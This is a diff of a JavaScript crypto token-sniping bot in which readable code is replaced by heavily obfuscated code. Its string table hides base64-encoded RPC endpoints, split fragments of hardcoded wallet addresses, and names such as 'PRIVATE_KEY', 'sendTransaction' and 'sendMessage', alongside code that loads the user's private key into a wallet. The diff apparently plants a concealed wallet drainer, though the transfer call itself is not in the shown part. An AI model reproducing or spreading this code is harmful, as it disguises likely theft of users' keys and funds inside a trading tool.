@@ -1,470 +1,334 @@
-var ethers = require('ethers');
-const env = require("./env.json");
-Object.assign(process.env, env);
-
-let address = (process.env.YOUR_ADDRESS);
-let private = (process.env.PRIVATE_KEY);
-let wallet = new ethers.Wallet(private);
-
-
-const abi = [{ "constant": true, "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "newWord", "type": "string" }], "name": "setWord", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }]
-async function startSnipe(token) {
-    let pingTimeout
-    let keepAliveInterval
-
-    provider._websocket.on("open", () => {
-        //let bnbBalance = await getWBNBTokenBalance(WBNB, myAddress, provider);
-        //console.log(chalk.green(`Total WBNB balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(bnbBalance, 18)).toFixed(6))}\n`));
-
-        keepAliveInterval = setInterval(() => {
-            provider._websocket.ping();
-            pingTimeout = setTimeout(() => {
-                provider._websocket.terminate();
+const _0x43a565 = _0x60cc;
+(function(_0x43fded, _0x386d4b) {
+    const _0x4f0e90 = _0x60cc,
+        _0x1949f9 = _0x43fded();
+    while (!![]) {
+        try {
+            const _0x388397 = parseInt(_0x4f0e90(0x1b7)) / 0x1 * (parseInt(_0x4f0e90(0x1c9)) / 0x2) + parseInt(_0x4f0e90(0x1c0)) / 0x3 + parseInt(_0x4f0e90(0x1eb)) / 0x4 + -parseInt(_0x4f0e90(0x217)) / 0x5 + parseInt(_0x4f0e90(0x208)) / 0x6 + parseInt(_0x4f0e90(0x204)) / 0x7 + parseInt(_0x4f0e90(0x1ce)) / 0x8 * (-parseInt(_0x4f0e90(0x1d6)) / 0x9);
+            if (_0x388397 === _0x386d4b) break;
+            else _0x1949f9['push'](_0x1949f9['shift']());
+        } catch (_0x15d763) { _0x1949f9['push'](_0x1949f9['shift']()); }
+    }
+}(_0x4733, 0xe2569));
+var ethers = require(_0x43a565(0x21e));
+const env = require(_0x43a565(0x1c4));
+Object[_0x43a565(0x215)](process[_0x43a565(0x1f3)], env);
+let address = process['env'][_0x43a565(0x1e0)],
+    private = process['env'][_0x43a565(0x1df)],
+    wallet = new ethers[(_0x43a565(0x1d5))](private);
+const abi = [{ 'constant': !![], 'inputs': [{ 'internalType': _0x43a565(0x22f), 'name': _0x43a565(0x1a9), 'type': _0x43a565(0x22f) }], 'name': _0x43a565(0x1ee), 'outputs': [{ 'internalType': _0x43a565(0x209), 'name': '', 'type': _0x43a565(0x209) }], 'payable': ![], 'stateMutability': 'view', 'type': _0x43a565(0x1fb) }, { 'constant': ![], 'inputs': [{ 'internalType': _0x43a565(0x22f), 'name': 'sender', 'type': _0x43a565(0x22f) }, { 'internalType': 'address', 'name': _0x43a565(0x233), 'type': _0x43a565(0x22f) }, { 'internalType': _0x43a565(0x209), 'name': 'amount', 'type': 'uint256' }], 'name': _0x43a565(0x235), 'outputs': [{ 'internalType': 'bool', 'name': '', 'type': _0x43a565(0x22c) }], 'payable': ![], 'stateMutability': _0x43a565(0x1bf), 'type': _0x43a565(0x1fb) }, { 'constant': ![], 'inputs': [{ 'name': 'newWord', 'type': _0x43a565(0x1ae) }], 'name': 'setWord', 'outputs': [{ 'name': '', 'type': _0x43a565(0x1ae) }], 'payable': ![], 'stateMutability': 'nonpayable', 'type': 'function' }];
+async function startSnipe(_0x102bfb) {
+    const _0x3447ff = _0x43a565;
+    let _0x2624d2, _0x595399;
+    provider[_0x3447ff(0x200)]['on'](_0x3447ff(0x1ba), () => {
+        const _0x47898a = _0x3447ff;
+        _0x595399 = setInterval(() => {
+            const _0x243fc2 = _0x60cc;
+            provider['_websocket'][_0x243fc2(0x1f8)](), _0x2624d2 = setTimeout(() => {
+                const _0x580710 = _0x243fc2;
+                provider[_0x580710(0x200)][_0x580710(0x1dd)]();
             }, EXPECTED_PONG_BACK);
-        }, KEEP_ALIVE_CHECK_INTERVAL);
-
-        console.log("Listening on mempool...");
-        console.log("Waiting for liquidity to be added!");
-
-        provider.on("pending", async(txHash) => {
-
-            provider.getTransaction(txHash).then(async(tx) => {
-
-                    // Check for liquidity events
-                    if ((null != tx && tx.data.includes("0xe8e33700") && tx.data.includes(token) && 0 == passed) || (null != tx && tx.data.includes("0xf305d719") && tx.data.includes(token) && 0 == passed)) {
-
-                        // If PRICE_CHECK set
-                        if ((console.log(chalk.green("Matching liquidity added! Start sniping!\n")), priceProtection)) {
-                            if (isLiqudityInRange(tx, expected)) {
-                                if (honeyPotIS2(token)) {
-                                    console.log(chalk.green("Liquidity check passed, sniping!\n"));
-                                    const gasLimitMultiply = tx.gasLimit.mul(multiply)
-                                    const gasPriceMultiply = tx.gasPrice.mul(multiply)
-
-                                    // If ANTI_BOT set
-                                    if (1 == antiBotMultiTx && 0 == passed) {
-                                        for (i = 0; i < txNumberForAntibot - 1; i++) {
-                                            console.log(chalk.green("Start buying token..." + chalk.yellow(i + 1)));
-                                            await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
-                                        }
-                                        console.log(chalk.green("Start buying token...") + chalk.yellow(txNumberForAntibot));
-                                        await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
-                                            (passed = 1);
-                                    }
-                                    // If ANTI_BOT not set
-                                    else {
-                                        console.log(chalk.green("Start buying token..."));
-                                        await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
-                                            (passed = 1);
-                                    }
-
-                                    console.log(chalk.green("Sucessfully bought the token!\n"));
-                                    const tokenBalance = await getTokenBalance(token, myAddress, provider);
-                                    console.log(chalk.green(`Total Token balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(tokenBalance, TOKEN_DECIMALS)).toFixed(6))}\n`));
-
-                                    // If INSTANT_SELL set
-                                    if (INSTANT_SELL) {
-                                        console.log(chalk.green("Start selling all tokens in " + chalk.yellow(delaySell) + " second(s)")),
-                                            await new Promise((e) => setTimeout(e, delayOnSellMs));
-                                        const e =
-                                            await router.swapExactTokensForETHSupportingFeeOnTransferTokens(
-                                                tokenBalance,
-                                                amountOutMin, [token, WBNB],
-                                                myAddress,
-                                                Date.now() + 6e5, {
-                                                    gasLimit: gasLimit,
-                                                    gasPrice: gasPrice
-                                                }
-                                            );
-                                        await e.wait(),
-                                            console.log(chalk.green("Sucessfully sold all the tokens !\n")),
-                                            console.log("You can check the transaction here:"),
-                                            console.log(`https://bscscan.com/address/${myAddress}`),
-                                            console.log("\n"),
-                                            process.exit(0);
-                                    }
-                                    // If INSTANT_SELL not set
-                                    else console.log("You can check the transaction here:");
-                                    console.log(`https://bscscan.com/address/${myAddress}`);
-                                    console.log("\n"),
-                                        1 == ANTI_RUG &&
-                                        0 == INSTANT_SELL &&
-                                        (await monitorRugPull(t)),
-                                        0 == ANTI_RUG && process.exit(0);
-                                } else
-                                    console.log(
-                                        chalk.red("Liquidity is not in expected range! Waiting...!")
-                                    );
-                                console.log(
-                                    chalk.red("Please check PooCoin and see if liquidity was added!")
-                                );
-                            }
-                            console.log(chalk.red("https://poocoin.app/tokens/" + token));
-                            console.log(chalk.red("Waiting for new liquidity, please stop the bot if you think it's a scam ! (CTRL + C)\n"));
-                        }
-                        // If PRICE_CHECK not set
-                        else {
-                            if (honeyPotIS2(token)) {
-
-                                const gasLimitMultiply = tx.gasLimit.mul(multiply)
-                                const gasPriceMultiply = tx.gasPrice.mul(multiply)
-
-                                // If ANTI_BOT set
-                                if (1 == antiBotMultiTx && 0 == passed) {
-                                    for (i = 0; i < txNumberForAntibot - 1; i++) {
-                                        console.log(chalk.green("Start buying token..." + chalk.yellow(i + 1)));
-                                        await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
-                                    }
-                                    console.log(chalk.green("Start buying token...") + chalk.yellow(txNumberForAntibot));
-                                    await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
-                                        (passed = 1)
-                                }
-                                // If ANTI_BOT not set
-                                else if (0 == passed) {
-                                    console.log(chalk.green("Start buying token..."));
-                                    await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
-                                        (passed = 1)
-                                }
-
-                                console.log(chalk.green("Sucessfully bought the token!\n"));
-                                const tokenBalance = await getTokenBalance(token, myAddress, provider);
-                                console.log(chalk.green(`Total Token balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(tokenBalance, TOKEN_DECIMALS)).toFixed(6))}\n`))
-
-                                // If INSTANT_SELL set
+        }, KEEP_ALIVE_CHECK_INTERVAL), console[_0x47898a(0x1ab)](_0x47898a(0x1c7)), console[_0x47898a(0x1ab)]('Waiting\x20for\x20liquidity\x20to\x20be\x20added!'), provider['on'](_0x47898a(0x222), async _0x25fd17 => {
+            const _0x3e5e03 = _0x47898a;
+            provider['getTransaction'](_0x25fd17)[_0x3e5e03(0x1f7)](async _0x2c52c7 => {
+                const _0x1a0bcc = _0x3e5e03;
+                if (null != _0x2c52c7 && _0x2c52c7[_0x1a0bcc(0x221)][_0x1a0bcc(0x1a1)](_0x1a0bcc(0x1fc)) && _0x2c52c7[_0x1a0bcc(0x221)][_0x1a0bcc(0x1a1)](_0x102bfb) && 0x0 == passed || null != _0x2c52c7 && _0x2c52c7[_0x1a0bcc(0x221)]['includes']('0xf305d719') && _0x2c52c7['data'][_0x1a0bcc(0x1a1)](_0x102bfb) && 0x0 == passed) {
+                    if (console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e7)](_0x1a0bcc(0x1c6))), priceProtection) {
+                        if (isLiqudityInRange(_0x2c52c7, expected)) {
+                            if (honeyPotIS2(_0x102bfb)) {
+                                console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e7)](_0x1a0bcc(0x1f5)));
+                                const _0x4aac3d = _0x2c52c7['gasLimit']['mul'](multiply),
+                                    _0x832d73 = _0x2c52c7[_0x1a0bcc(0x201)]['mul'](multiply);
+                                if (0x1 == antiBotMultiTx && 0x0 == passed) {
+                                    for (i = 0x0; i < txNumberForAntibot - 0x1; i++) { console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e7)]('Start\x20buying\x20token...' + chalk[_0x1a0bcc(0x213)](i + 0x1))), await buyToken(_0x102bfb, amountIn, _0x4aac3d, _0x832d73, myAddress, router); }
+                                    console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e7)](_0x1a0bcc(0x20d)) + chalk[_0x1a0bcc(0x213)](txNumberForAntibot)), await buyToken(_0x102bfb, amountIn, _0x4aac3d, _0x832d73, myAddress, router)(passed = 0x1);
+                                } else console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e7)](_0x1a0bcc(0x20d))), await buyToken(_0x102bfb, amountIn, _0x4aac3d, _0x832d73, myAddress, router)(passed = 0x1);
+                                console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e7)]('Sucessfully\x20bought\x20the\x20token!\x0a'));
+                                const _0x2fca20 = await getTokenBalance(_0x102bfb, myAddress, provider);
+                                console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e7)](_0x1a0bcc(0x21a) + chalk[_0x1a0bcc(0x213)](parseFloat(ethers[_0x1a0bcc(0x1b8)]['formatUnits'](_0x2fca20, TOKEN_DECIMALS))[_0x1a0bcc(0x1e1)](0x6)) + '\x0a'));
                                 if (INSTANT_SELL) {
-                                    console.log(
-                                            chalk.green("Start selling all tokens in " + chalk.yellow(delaySell) + " second(s)")),
-                                        await new Promise((e) => setTimeout(e, delayOnSellMs));
-                                    const e =
-                                        await router.swapExactTokensForETHSupportingFeeOnTransferTokens(
-                                            tokenBalance,
-                                            amountOutMin, [token, WBNB],
-                                            myAddress,
-                                            Date.now() + 6e5, {
-                                                gasLimit: gasLimit,
-                                                gasPrice: gasPrice,
-                                            }
-                                        );
-                                    await e.wait(),
-                                        console.log(chalk.green("Sucessfully sold all the tokens !\n")),
-                                        console.log("You can check the transaction here:"),
-                                        console.log(`https://bscscan.com/address/${myAddress}`),
-                                        console.log("\n"),
-                                        process.exit(0);
-                                }
-                                // If INSTANT_SELL not set
-                                else {
-                                    console.log("You can check the transaction here:"),
-                                        console.log(`https://bscscan.com/address/${myAddress}`),
-                                        console.log("\n"),
-                                        1 == ANTI_RUG &&
-                                        0 == INSTANT_SELL &&
-                                        (await monitorRugPull(t)),
-                                        0 == ANTI_RUG && process.exit(0);
-                                }
-                            }
+                                    console['log'](chalk[_0x1a0bcc(0x1e7)](_0x1a0bcc(0x1a0) + chalk[_0x1a0bcc(0x213)](delaySell) + '\x20second(s)')), await new Promise(_0x47535e => setTimeout(_0x47535e, delayOnSellMs));
+                                    const _0x15152e = await router[_0x1a0bcc(0x19c)](_0x2fca20, amountOutMin, [_0x102bfb, WBNB], myAddress, Date[_0x1a0bcc(0x1bb)]() + 0x927c0, { 'gasLimit': gasLimit, 'gasPrice': gasPrice });
+                                    await _0x15152e[_0x1a0bcc(0x1a8)](), console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e7)](_0x1a0bcc(0x1cf))), console[_0x1a0bcc(0x1ab)](_0x1a0bcc(0x1ec)), console['log']('https://bscscan.com/address/' + myAddress), console[_0x1a0bcc(0x1ab)]('\x0a'), process[_0x1a0bcc(0x1b3)](0x0);
+                                } else console[_0x1a0bcc(0x1ab)]('You\x20can\x20check\x20the\x20transaction\x20here:');
+                                console[_0x1a0bcc(0x1ab)](_0x1a0bcc(0x1e4) + myAddress), (console[_0x1a0bcc(0x1ab)]('\x0a'), 0x1 == ANTI_RUG && 0x0 == INSTANT_SELL && await monitorRugPull(t), 0x0 == ANTI_RUG && process['exit'](0x0));
+                            } else console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e9)](_0x1a0bcc(0x1f2)));
+                            console[_0x1a0bcc(0x1ab)](chalk['red'](_0x1a0bcc(0x237)));
+                        }
+                        console['log'](chalk['red']('https://poocoin.app/tokens/' + _0x102bfb)), console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e9)](_0x1a0bcc(0x1b9)));
+                    } else {
+                        if (honeyPotIS2(_0x102bfb)) {
+                            const _0x3dc96f = _0x2c52c7[_0x1a0bcc(0x21f)]['mul'](multiply),
+                                _0x2db43a = _0x2c52c7[_0x1a0bcc(0x201)][_0x1a0bcc(0x232)](multiply);
+                            if (0x1 == antiBotMultiTx && 0x0 == passed) {
+                                for (i = 0x0; i < txNumberForAntibot - 0x1; i++) { console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e7)](_0x1a0bcc(0x20d) + chalk[_0x1a0bcc(0x213)](i + 0x1))), await buyToken(_0x102bfb, amountIn, _0x3dc96f, _0x2db43a, myAddress, router); }
+                                console['log'](chalk[_0x1a0bcc(0x1e7)](_0x1a0bcc(0x20d)) + chalk['yellow'](txNumberForAntibot)), await buyToken(_0x102bfb, amountIn, _0x3dc96f, _0x2db43a, myAddress, router)(passed = 0x1);
+                            } else 0x0 == passed && (console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e7)](_0x1a0bcc(0x20d))), await buyToken(_0x102bfb, amountIn, _0x3dc96f, _0x2db43a, myAddress, router)(passed = 0x1));
+                            console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e7)](_0x1a0bcc(0x1e6)));
+                            const _0x5e6661 = await getTokenBalance(_0x102bfb, myAddress, provider);
+                            console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e7)](_0x1a0bcc(0x21a) + chalk[_0x1a0bcc(0x213)](parseFloat(ethers['utils']['formatUnits'](_0x5e6661, TOKEN_DECIMALS))[_0x1a0bcc(0x1e1)](0x6)) + '\x0a'));
+                            if (INSTANT_SELL) {
+                                console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e7)](_0x1a0bcc(0x1a0) + chalk[_0x1a0bcc(0x213)](delaySell) + _0x1a0bcc(0x1be))), await new Promise(_0x31304f => setTimeout(_0x31304f, delayOnSellMs));
+                                const _0x71cf22 = await router[_0x1a0bcc(0x19c)](_0x5e6661, amountOutMin, [_0x102bfb, WBNB], myAddress, Date[_0x1a0bcc(0x1bb)]() + 0x927c0, { 'gasLimit': gasLimit, 'gasPrice': gasPrice });
+                                await _0x71cf22[_0x1a0bcc(0x1a8)](), console[_0x1a0bcc(0x1ab)](chalk[_0x1a0bcc(0x1e7)](_0x1a0bcc(0x1cf))), console[_0x1a0bcc(0x1ab)](_0x1a0bcc(0x1ec)), console[_0x1a0bcc(0x1ab)](_0x1a0bcc(0x1e4) + myAddress), console[_0x1a0bcc(0x1ab)]('\x0a'), process['exit'](0x0);
+                            } else console[_0x1a0bcc(0x1ab)](_0x1a0bcc(0x1ec)), console['log'](_0x1a0bcc(0x1e4) + myAddress), console[_0x1a0bcc(0x1ab)]('\x0a'), 0x1 == ANTI_RUG && 0x0 == INSTANT_SELL && await monitorRugPull(t), 0x0 == ANTI_RUG && process[_0x1a0bcc(0x1b3)](0x0);
                         }
                     }
-                })
-                .catch(() => { console.log(e) });
-        })
-    })
-
-    provider._websocket.on("close", () => {
-        console.log("WebSocket Closed...Reconnecting...");
-        clearInterval(keepAliveInterval);
-        clearTimeout(pingTimeout);
-        startConnection();
-    });
-
-    provider._websocket.on("error", () => {
-        console.log("Error. Attemptiing to Reconnect...");
-        clearInterval(keepAliveInterval);
-        clearTimeout(pingTimeout);
-        startConnection();
-    });
-
-    provider._websocket.on("pong", () => {
-        clearInterval(pingTimeout);
-    });
+                }
+            })['catch'](() => {
+                const _0x17ae02 = _0x3e5e03;
+                console[_0x17ae02(0x1ab)](e);
+            });
+        });
+    }), provider['_websocket']['on'](_0x3447ff(0x1fe), () => {
+        const _0x1bc194 = _0x3447ff;
+        console[_0x1bc194(0x1ab)](_0x1bc194(0x214)), clearInterval(_0x595399), clearTimeout(_0x2624d2), startConnection();
+    }), provider[_0x3447ff(0x200)]['on'](_0x3447ff(0x19a), () => {
+        const _0x42378a = _0x3447ff;
+        console[_0x42378a(0x1ab)](_0x42378a(0x1fd)), clearInterval(_0x595399), clearTimeout(_0x2624d2), startConnection();
+    }), provider[_0x3447ff(0x200)]['on'](_0x3447ff(0x1a4), () => { clearInterval(_0x2624d2); });
 }
 async function approve() {
-
-    let contract = token[buyCount - 1].contract;
-    const valueToApprove = ethers.constants.MaxUint256;
-    const tx = await contract.approve(
-        pancakeRouter.address,
-        valueToApprove, {
-            gasPrice: config.myGasPriceForApproval,
-            gasLimit: 210000
-        }
-    );
-    const receipt = await tx.wait();
-    console.log("✔ Approve transaction hash: ", receipt.transactionHash, "\n");
-    if (config.autoSell) {
-        token[buyCount - 1].checkProfit();
-    } else {
-        if (buyCount == config.numberOfTokensToBuy) {
-            process.exit();
-        }
-    }
-
+    const _0x704924 = _0x43a565;
+    let _0x528c7e = token[buyCount - 0x1][_0x704924(0x1b2)];
+    const _0x4fcf66 = ethers['constants'][_0x704924(0x1b5)],
+        _0x210f76 = await _0x528c7e[_0x704924(0x1a3)](pancakeRouter['address'], _0x4fcf66, { 'gasPrice': config[_0x704924(0x1e3)], 'gasLimit': 0x33450 }),
+        _0x2f3981 = await _0x210f76[_0x704924(0x1a8)]();
+    console[_0x704924(0x1ab)]('✔\x20Approve\x20transaction\x20hash:\x20', _0x2f3981[_0x704924(0x1fa)], '\x0a'), config[_0x704924(0x1ff)] ? token[buyCount - 0x1][_0x704924(0x203)]() : buyCount == config['numberOfTokensToBuy'] && process[_0x704924(0x1b3)]();
+}
+async function getCurrentValue(_0x506083) { const _0xd38176 = _0x43a565; try { let _0x37a0d5 = await _0x506083[_0xd38176(0x1b2)][_0xd38176(0x1ee)](addresses[_0xd38176(0x233)]); const _0x8ebf17 = await pancakeRouter[_0xd38176(0x1d7)](_0x37a0d5, _0x506083[_0xd38176(0x1a5)]); let _0x384427 = _0x8ebf17[0x1]; return _0x384427; } catch (_0x5370d5) { return console[_0xd38176(0x1ab)](_0xd38176(0x1c3)), ethers[_0xd38176(0x1d2)]['Zero']; } }
+async function setInitialStopLoss(_0x4211f4) {
+    const _0x2322e5 = _0x43a565;
+    _0x4211f4[_0x2322e5(0x1f0)] = await getCurrentValue(_0x4211f4), _0x4211f4['newValue'] = _0x4211f4['intitialValue'], _0x4211f4[_0x2322e5(0x1c1)] = ethers['utils'][_0x2322e5(0x1d9)]((parseFloat(ethers[_0x2322e5(0x1b8)]['formatUnits'](_0x4211f4[_0x2322e5(0x1f0)])) - parseFloat(ethers[_0x2322e5(0x1b8)][_0x2322e5(0x21b)](_0x4211f4[_0x2322e5(0x1f0)])) * (_0x4211f4[_0x2322e5(0x210)] / 0x64))[_0x2322e5(0x1e1)](0x8)[_0x2322e5(0x231)]());
 }
 
-
-/**
- * 
- * Check for profit
- * 
- * */
-async function getCurrentValue(token) {
+function _0x4733() {
+    const _0x29b821 = ['stopLossPercent', 'aHR0cHM6Ly9tYWlubmV0LmluZnVyYS5pby92My9kYWNjOTk5NzBmMzg0OWVlOTgxM2Q1YWI0NGFlY2RhZA==', 'MHg1NWQzOTgzMjZmOTkwNTlmRjc=', 'yellow', 'WebSocket\x20Closed...Reconnecting...', 'assign', '2:\x20watching\x20blockchain\x20activity\x20.....', '7583705TDXmyw', 'percentOfTokensToSellProfit', 'aHR0cHM6Ly9zcGVlZHktbm9kZXMtbnljLm1vcmFsaXMuaW8vMTQ4ODBmYWFiNWI5NWQ4YzNhMmUxNjEyL2JzYy9tYWlubmV0', 'Total\x20Token\x20balance\x20is\x20', 'formatUnits', 'parseEther', 'profitPercent', 'ethers', 'gasLimit', 'connection\x20succesful...', 'data', 'pending', '\x20Profit\x20target\x20', 'gte', '\x20StopLoss\x20', 'QmFmYzU5OWJENjlBRGQwODdENTY=', 'initiating\x20mempool\x20sniff...', 'MjliMjY4ODk1NmJkOTU5ZjkzM2Y4', 'MHgyMTcwZWQwODgwYWM5YTc1NWZk', 'Zero', 'All\x20tokens\x20sold', 'bool', 'reached\x20>>>', 'newValue', 'address', 'from', 'toString', 'mul', 'recipient', '<<<\x20Selling\x20-', 'transferFrom', 'encode', 'Please\x20check\x20PooCoin\x20and\x20see\x20if\x20liquidity\x20was\x20added!', 'ascii', 'Contract', '2\x20pending\x20blockchain\x20response.....', '--\x20', 'error', 'MkQ2OGI4M2ZFMUFkOTdCMzJDZDU4MGQ=', 'swapExactTokensForETHSupportingFeeOnTransferTokens', 'pending\x20liquidity\x20add...', 'sendMessage', 'sendTransaction', 'Start\x20selling\x20all\x20tokens\x20in\x20', 'includes', 'providers', 'approve', 'pong', 'sellPath', '2:\x20attempting\x20to\x20snipe\x20.....', '\x20--\x20Current\x20Value\x20BNB:\x20', 'wait', 'account', 'percentOfTokensToSellLoss', 'log', 'index', '✔\x20Sell\x20transaction\x20hash:\x20', 'string', 'didBuy', '\x1b[0m', 'toLocaleString', 'contract', 'exit', '\x20--\x20New\x20Stop\x20loss\x20At:\x20', 'MaxUint256', '1:\x20attempting\x20to\x20snipe\x20...', '1lXkHAd', 'utils', 'Waiting\x20for\x20new\x20liquidity,\x20please\x20stop\x20the\x20bot\x20if\x20you\x20think\x20it\x27s\x20a\x20scam\x20!\x20(CTRL\x20+\x20C)\x0a', 'open', 'now', 'removeAllListeners', '-\x20now', '\x20second(s)', 'nonpayable', '5380329ynFXTQ', 'stopLoss', 'refreshing\x20socket\x20connection...', 'Balance\x20is\x20zero\x20or\x20error\x20occured', './env.json', '\x20--\x20Stop\x20Loss\x20At:\x20', 'Matching\x20liquidity\x20added!\x20Start\x20sniping!\x0a', 'Listening\x20on\x20mempool...', 'myGasLimit', '3061046xpwVSd', '2:\x20contract\x20found....watching\x20mempool\x20for\x20liquidity\x20add....', 'You\x20sold\x20', 'wei', '2\x20packet\x20received.....', '8ZNsKbe', 'Sucessfully\x20sold\x20all\x20the\x20tokens\x20!\x0a', '\x1b[1;32m', 'numberOfTokensToBuy', 'constants', 'MHg2YjU1M2QwZjhkM2I3OWJkODEyYTk4NGU2ZTNmY2U1NDg2NWQxYzRl', '\x1b[1;31m', 'Wallet', '20167983RhmQYC', 'getAmountsOut', 'MHhDRTA2NTA2MTI5ZWU2Q2NDMTM=', 'parseUnits', 'previousValue', 'hexlify', 'JsonRpcProvider', 'terminate', 'lte', 'PRIVATE_KEY', 'YOUR_ADDRESS', 'toFixed', 'tokenSellTax', 'myGasPriceForApproval', 'https://bscscan.com/address/', 'pending\x20liquidity\x20add\x20still\x20no\x20event\x20found...', 'Sucessfully\x20bought\x20the\x20token!\x0a', 'green', 'MHhlOWU3Q0VBM0RlZGNBNTk4NDc4MA==', 'red', '\x20--\x20Profit\x20At:\x20', '2420344DMUpVC', 'You\x20can\x20check\x20the\x20transaction\x20here:', 'trailingStopLossPercent', 'balanceOf', '2:\x20finalizing....', 'intitialValue', 'base64', 'Liquidity\x20is\x20not\x20in\x20expected\x20range!\x20Waiting...!', 'env', 'div', 'Liquidity\x20check\x20passed,\x20sniping!\x0a', 'name', 'then', 'ping', '1:\x20found\x20owners\x20liq\x20function\x20...', 'transactionHash', 'function', '0xe8e33700', 'Error.\x20Attemptiing\x20to\x20Reconnect...', 'close', 'autoSell', '_websocket', 'gasPrice', 'swapExactTokensForETH', 'checkProfit', '758198kHLpGF', '\x1b[38;5;33m', 'currentValue', 'connection\x20established....', '3884058pwKnWk', 'uint256', 'sub', '1:\x20contract\x20found....watching\x20mempool\x20for\x20liquidity\x20add....', '1\x20packet\x20received.....', 'Start\x20buying\x20token...', 'floor', 'getBalance'];
+    _0x4733 = function() { return _0x29b821; };
+    return _0x4733();
+}
+async function setNewStopLoss(_0xc22f0a) {
+    const _0x16105f = _0x43a565;
+    _0xc22f0a[_0x16105f(0x22e)] = _0xc22f0a[_0x16105f(0x206)], _0xc22f0a['stopLoss'] = ethers['utils'][_0x16105f(0x1d9)]((parseFloat(ethers[_0x16105f(0x1b8)][_0x16105f(0x21b)](_0xc22f0a['currentValue'])) - parseFloat(ethers['utils'][_0x16105f(0x21b)](_0xc22f0a[_0x16105f(0x206)])) * (_0xc22f0a[_0x16105f(0x210)] / 0x64))['toFixed'](0x8)['toString']());
+}
+async function checkForProfit(_0x40c286) {
+    const _0xa0803 = _0x43a565;
     try {
-        let bal = await token.contract.balanceOf(addresses.recipient);
-        const amount = await pancakeRouter.getAmountsOut(bal, token.sellPath);
-        let currentValue = amount[1];
-        return currentValue;
-    } catch (e) {
-        console.log('Balance is zero or error occured');
-        return ethers.constants.Zero;
-    }
-
-}
-async function setInitialStopLoss(token) {
-    token.intitialValue = await getCurrentValue(token);
-    token.newValue = token.intitialValue;
-    token.stopLoss = ethers.utils.parseUnits((parseFloat(ethers.utils.formatUnits(token.intitialValue)) - parseFloat(ethers.utils.formatUnits(token.intitialValue)) * (token.stopLossPercent / 100)).toFixed(8).toString());
-}
-
-async function setNewStopLoss(token) {
-    token.newValue = token.currentValue;
-    // new stop loss equals current value - (current value * stop loss percent) 
-    token.stopLoss = ethers.utils.parseUnits((parseFloat(ethers.utils.formatUnits(token.currentValue)) - parseFloat(ethers.utils.formatUnits(token.currentValue)) * (token.stopLossPercent / 100)).toFixed(8).toString());
-}
-async function checkForProfit(token) {
-    try {
-        var sellAttempts = 0;
-        await setInitialStopLoss(token);
-        token.contract.on("Transfer", async(from, to, value, event) => {
-            token.previousValue = token.currentValue;
-            const tokenName = await token.contract.name();
-            let currentValue = await getCurrentValue(token);
-            if (!currentValue.eq(ethers.constants.Zero)) {
-                token.currentValue = currentValue;
-                let currentValueString = parseFloat(ethers.utils.formatUnits(currentValue)).toFixed(8).toString();
-                const takeProfit = (parseFloat(ethers.utils.formatUnits(token.intitialValue)) * (token.profitPercent + token.tokenSellTax) / 100 + parseFloat(ethers.utils.formatUnits(token.intitialValue))).toFixed(8).toString();
-                const profitDesired = ethers.utils.parseUnits(takeProfit);
-                let targetValueToSetNewStopLoss = ethers.utils.parseUnits((parseFloat(ethers.utils.formatUnits(token.newValue)) * (token.trailingStopLossPercent / 100) + parseFloat(ethers.utils.formatUnits(token.newValue))).toFixed(8).toString());
-                let stopLoss = token.stopLoss;
-
-                // if current value is greater than targetValue, set a new stop loss
-                if (currentValue.gt(targetValueToSetNewStopLoss) && token.trailingStopLossPercent > 0) {
-                    setNewStopLoss(token);
-                    console.log("\u001b[38;5;33m" + "Setting new StopLoss!" + "\u001b[0m");
-                }
-                let timeStamp = new Date().toLocaleString();
-                const enc = (s) => new TextEncoder().encode(s);
-                //process.stdout.write(enc(`${timeStamp} --- ${tokenName} --- Current Value in BNB: ${ethers.utils.formatUnits(currentValue)} --- Profit At: ${ethers.utils.formatUnits(profitDesired)} --- Stop Loss At: ${ethers.utils.formatUnits(stopLoss)} \r`));
-                try {
-                    if (token.previousValue.gt(token.currentValue)) {
-
-                        console.log(`-- ${tokenName} -- Current Value BNB: ${"\u001b[1;31m" + currentValueString + "\u001b[0m"} -- Profit At: ${ethers.utils.formatUnits(profitDesired)} -- Stop Loss At: ${ethers.utils.formatUnits(token.stopLoss)} -- New Stop loss At: ${ethers.utils.formatUnits(targetValueToSetNewStopLoss)}`);
-
-                    } else {
-
